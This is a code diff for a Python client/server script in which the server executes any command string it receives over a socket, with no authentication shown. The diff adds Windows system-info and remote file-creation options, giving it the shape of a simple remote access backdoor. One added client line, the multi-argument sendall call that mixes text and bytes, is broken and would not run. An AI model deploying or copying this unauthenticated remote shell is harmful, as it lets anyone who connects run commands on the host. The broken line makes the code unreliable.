@@ -81,8 +81,12 @@ def run_client(port):
             cusshell = input("$ ")
             client_socket.sendall(b'custom ' + cusshell.encode())
         elif choice == '5':
-            cusshell = 'sysinfo'
+            cusshell = 'systeminfo'
             client_socket.sendall(b'custom ' + cusshell.encode())
+        elif choice == '6':
+            filename = input("filename: ")
+            path = input("Path: ")
+            client_socket.sendall(b'makefile cd /d', path, '&& type hi > ' + filename.encode())
         else:
             print("Invalid choice. Please try again.")
 #server
@@ -118,6 +122,14 @@ def run_server():
                 time.sleep(2)
             elif decoded_data.startswith('custom '):
                 command2 = decoded_data[7:]
+                try:
+                    run(command2)
+                    response2 = f'Process "{command2}" ran successfully.'
+                except Exception as e:
+                    response2 = f'Error running "{command2}": {e}'
+                client_socket.sendall(response2.encode())
+            elif decoded_data.startswith('makefile '):
+                command2 = decoded_data[9:]
                 try:
                     run(command2)
                     response2 = f'Process "{command2}" ran successfully.'
